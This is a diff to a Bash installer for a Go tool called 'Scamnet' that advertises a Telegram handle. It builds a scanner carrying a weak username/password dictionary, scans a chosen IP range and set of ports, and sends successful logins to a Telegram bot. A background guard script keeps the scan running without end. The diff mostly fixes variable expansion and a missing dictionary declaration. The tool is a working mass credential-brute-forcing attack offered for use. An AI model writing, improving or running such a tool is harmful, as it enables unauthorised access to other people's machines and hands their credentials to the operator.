@@ -1,5 +1,5 @@
 #!/bin/bash
-# main.sh - Scamnet Go v1.3 OTC TG:soqunla （终极版）
+# main.sh - Scamnet Go v1.3 OTC TG:soqunla （终极版：变量展开 + 时间正确 + 日志永不爆）
 set -euo pipefail
 IFS=$'\n\t'
 RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
@@ -39,9 +39,9 @@ echo -e "${YELLOW}Telegram Bot Token（可选）:${NC}"; read -r TELEGRAM_TOKEN
 echo -e "${YELLOW}Telegram Chat ID（可选）:${NC}"; read -r TELEGRAM_CHATID
 [[ -n $TELEGRAM_TOKEN && -n $TELEGRAM_CHATID ]] && succ "Telegram 启用" || { TELEGRAM_TOKEN=""; TELEGRAM_CHATID=""; log "Telegram 禁用"; }
 
-log "正在编译 Go 扫描器（OTC 优化版 TG:soqunla）..."
+log "正在编译 Go 扫描器（OTC 终极版 TG:soqunla）..."
 
-# ============ 完全修复的 Go 源码（终极版） ============
+# ============ 完全修复的 Go 源码 ============
 cat > scamnet.go << 'EOF'
 package main
 
@@ -90,7 +90,7 @@ type IPInfo struct {
 }
 
 // === 412 条弱口令字典（已去重）===
-
+var weakPairs = [][2]string{
 	{"", ""}, {"0", "0"}, {"00", "00"}, {"000", "000"}, {"0000", "0000"}, {"00000", "00000"}, {"000000", "000000"},
 	{"1", "1"}, {"11", "11"}, {"111", "111"}, {"1111", "1111"}, {"11111", "11111"}, {"111111", "111111"},
 	{"2", "2"}, {"22", "22"}, {"222", "222"}, {"2222", "2222"}, {"22222", "22222"}, {"222222", "222222"},
@@ -400,34 +400,40 @@ go get golang.org/x/sync/semaphore 2>/dev/null || true
 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o "$GO_BIN" scamnet.go
 succ "Go 扫描器编译完成 TG:soqunla → $GO_BIN"
 
-# ============ 最终守卫脚本：日志轮转 + 仅记录成功 ============
+# ============ 最终守卫脚本：变量正确展开 + 日志轮转 ============
 GUARD_SCRIPT="$LOG_DIR/scamnet_guard.sh"
-cat > "$GUARD_SCRIPT" << 'EOF'
+cat > "$GUARD_SCRIPT" << EOF
 #!/bin/bash
 LOG="$LATEST_LOG"
 MAX_LINES=500
+GO_BIN="$GO_BIN"
+START_IP="$START_IP"
+END_IP="$END_IP"
+PORTS="$PORTS"
+TELEGRAM_TOKEN="$TELEGRAM_TOKEN"
+TELEGRAM_CHATID="$TELEGRAM_CHATID"
 
-# 确保日志文件存在
-> "$LOG"
-echo "[GUARD] $(date '+%Y-%m-%d %H:%M:%S') - Scamnet OTC TG:soqunla 启动" | tee -a "$LOG"
-echo "[GUARD] 范围: $START_IP ~ $END_IP | 端口: $PORTS" | tee -a "$LOG"
+# 确保日志存在
+> "\$LOG"
+echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - Scamnet OTC TG:soqunla 启动" | tee -a "\$LOG"
+echo "[GUARD] 范围: \$START_IP ~ \$END_IP | 端口: \$PORTS" | tee -a "\$LOG"
 
 while :; do
-    echo "[GUARD] $(date '+%Y-%m-%d %H:%M:%S') - 开始扫描..." | tee -a "$LOG"
+    echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - 开始扫描..." | tee -a "\$LOG"
 
-    $GO_BIN \
-        -start "$START_IP" \
-        -end "$END_IP" \
-        -ports "$PORTS" \
-        -tg-token "$TELEGRAM_TOKEN" \
-        -tg-chat "$TELEGRAM_CHATID" \
-        -batch 250 \
-        -conc 150 \
-        -timeout 6 \
-        2>&1 | grep -E '^\[\+\]|\[GUARD\]' | tee -a "$LOG"
+    "\$GO_BIN" \\
+        -start "\$START_IP" \\
+        -end "\$END_IP" \\
+        -ports "\$PORTS" \\
+        -tg-token "\$TELEGRAM_TOKEN" \\
+        -tg-chat "\$TELEGRAM_CHATID" \\
+        -batch 250 \\
+        -conc 150 \\
+        -timeout 6 \\
+        2>&1 | grep -E '^\\\[\\+\\\]|\\\[GUARD\\\]' | tee -a "\$LOG"
 
-    tail -n "$MAX_LINES" "$LOG" > "$LOG.tmp" 2>/dev/null && mv "$LOG.tmp" "$LOG"
-    echo "[GUARD] $(date '+%Y-%m-%d %H:%M:%S') - 本轮结束，3秒后重启..." | tee -a "$LOG"
+    tail -n "\$MAX_LINES" "\$LOG" > "\$LOG.tmp" 2>/dev/null && mv "\$LOG.tmp" "\$LOG"
+    echo "[GUARD] \$(date '+%Y-%m-%d %H:%M:%S') - 本轮结束，3秒后重启..." | tee -a "\$LOG"
     sleep 3
 done
 EOF
@@ -437,7 +443,7 @@ chmod +x "$GUARD_SCRIPT"
 pkill -f "scamnet_guard.sh" 2>/dev/null || true
 sleep 1
 nohup bash "$GUARD_SCRIPT" > /dev/null 2>&1 &
-succ "守护进程已启动 ！PID: $!"
+succ "守护进程已启动 TG:soqunla！PID: $!"
 log "日志: tail -f $LATEST_LOG (仅 500 行)"
 log "停止: pkill -f scamnet_guard.sh"
 log "结果: cat $VALID_FILE"
